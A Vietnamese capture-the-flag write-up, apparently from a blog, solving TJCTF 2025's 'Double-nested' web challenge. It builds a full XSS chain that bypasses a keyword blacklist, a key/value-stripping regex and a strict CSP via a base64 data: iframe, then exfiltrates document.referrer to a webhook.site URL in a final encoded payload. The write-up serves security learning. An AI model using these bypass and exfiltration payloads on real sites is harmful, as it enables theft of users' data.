---
title: "JCCTF"
date: 2025-07-02
draft: false
description: "a description"
tags: ["example", "tag"]
---

# TJCTF - 2025

## Double-nested

### OverView

![image](https://hackmd.io/_uploads/BynGcDGSex.png)

```py=
def sanitize(input):
    input = re.sub(r"^(.*?=){,3}", "", input)
    forbidden = ["script", "http://", "&", "document", '"']
    if any([i in input.lower() for i in forbidden]) or len([i for i in range(len(input)) if input[i:i+2].lower()=="on"])!=len([i for i in range(len(input)) if input[i:i+8].lower()=="location"]): return 'Forbidden!'
    return input

```

1. Chức năng reg : `loại bỏ cặp 3 cặp key/value đầu `
   Ex : `a=b`
2. Black list các từ khoá dễ XSS => quên `alert()` 😃😃

Như ta thấy có CSP khá chặt

```python!
<meta http-equiv="Content-Security-Policy" content=" default-src 'self'; script-src 'self'; style-src 'self'; img-src 'none'; object-src 'none'; frame-src data:; manifest-src 'none'; ">
```

=> Rõ ràng là không thể XSS trực tiếp trên trang web

### Solve

Mục tiêu đầu tiên là thực thi được js đã
Như ta đã nói từ trước XSS không thể thực thi được tử trang web
Vậy có 1 con đường đó là `/gen`
![image](https://hackmd.io/_uploads/S1JDXAfHgg.png)
Để đến được đây thì phải qua được hai thứ

1. CSP
2. Sanitize

Dùng `<iframe src='data:text/html;base64, Nội dung thực thi js được decode base64'></iframe>` để bypass CSP

Dùng `http://localhost:5000/?i=%3D%3D%3D` kết hợp base64 để bypass được sanitize => loại bỏ được luận lí . Cốt lõi là dùng cái này`%3D%3D%3D` để loại bỏ 3 phần tử đầu
:::warning
Cần decode url trong cả `/` và `/gen`
:::
Alert(origin) => cho nó uy tín đã

```python!
<script>alert(origin)</script>
||
http://localhost:5000/gen?query=1%3D1%3Dalert%28origin%29
||
<script src="http://localhost:5000/gen?query=1%3D1%3Dalert%28origin%29"></script>
||
base64 => IDxzY3JpcHQgc3JjPSJodHRwOi8vbG9jYWxob3N0OjUwMDAvZ2VuP3F1ZXJ5PTElM0QxJTNEYWxlcnQlMjhvcmlnaW4lMjkiPjwvc2NyaXB0Pg==
||
<iframe src='data:text/html;base64,IDxzY3JpcHQgc3JjPSJodHRwOi8vbG9jYWxob3N0OjUwMDAvZ2VuP3F1ZXJ5PTElM0QxJTNEYWxlcnQlMjhvcmlnaW4lMjkiPjwvc2NyaXB0Pg=='></iframe>
||
URL endcode
%3Ciframe%20src%3D%27data%3Atext%2Fhtml%3Bbase64%2CIDxzY3JpcHQgc3JjPSJodHRwOi8vbG9jYWxob3N0OjUwMDAvZ2VuP3F1ZXJ5PTElM0QxJTNEYWxlcnQlMjhvcmlnaW4lMjkiPjwvc2NyaXB0Pg%3D%3D%27%3E%3C%2Fiframe%3E
||
gắn vào /
http://localhost:5000/?i=%3D%3D%3D%3Ciframe%20src%3D%27data%3Atext%2Fhtml%3Bbase64%2CIDxzY3JpcHQgc3JjPSJodHRwOi8vbG9jYWxob3N0OjUwMDAvZ2VuP3F1ZXJ5PTElM0QxJTNEYWxlcnQlMjhvcmlnaW4lMjkiPjwvc2NyaXB0Pg%3D%3D%27%3E%3C%2Fiframe%3E
```

![image](https://hackmd.io/_uploads/Sk9gH0MSle.png)
Auke giờ lấy flag nào
Tuy nhiên bị chặn tham số do document nằm trong black list
dùng open window
`top.location = 'https://webhook.site/d9d7c0aa-327d-4ea4-90f7-db6b0faf251e?i='+window['doc'+'ument'].referrer`
![image](https://hackmd.io/_uploads/r1CNdRzSgg.png)

thay nội dung `alert(1)` bằng `top.location = 'https://webhook.site/d9d7c0aa-327d-4ea4-90f7-db6b0faf251e?i='+window['doc'+'ument'].referrer` là xong
:::warning
Chú ý là thêm === vào sau tham số vì trong payload sau có chứa `on`
:::
Final payload

```!
%3Ciframe%20src%3D%27data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdCBzcmM9Imh0dHA6Ly9sb2NhbGhvc3Q6NTAwMC9nZW4%2FcXVlcnk9PT09dG9wLmxvY2F0aW9uJTIwJTNEJTIwJTI3aHR0cHMlM0ElMkYlMkZ3ZWJob29rLnNpdGUlMkZkOWQ3YzBhYS0zMjdkLTRlYTQtOTBmNy1kYjZiMGZhZjI1MWUlM0ZpJTNEJTI3JTJCd2luZG93JTVCJTI3ZG9jJTI3JTJCJTI3dW1lbnQlMjclNUQucmVmZXJyZXIiPjwvc2NyaXB0Pg%3D%3D%27%3E%3C%2Fiframe%3E
```

![image](https://hackmd.io/_uploads/Skq6Y0MHlx.png)

### Kiến thức đạt được

- bypass CSP -> iframe
- bypass black list chứa document -> top.location .....
- bypass luận lí key/value `a` = `b`
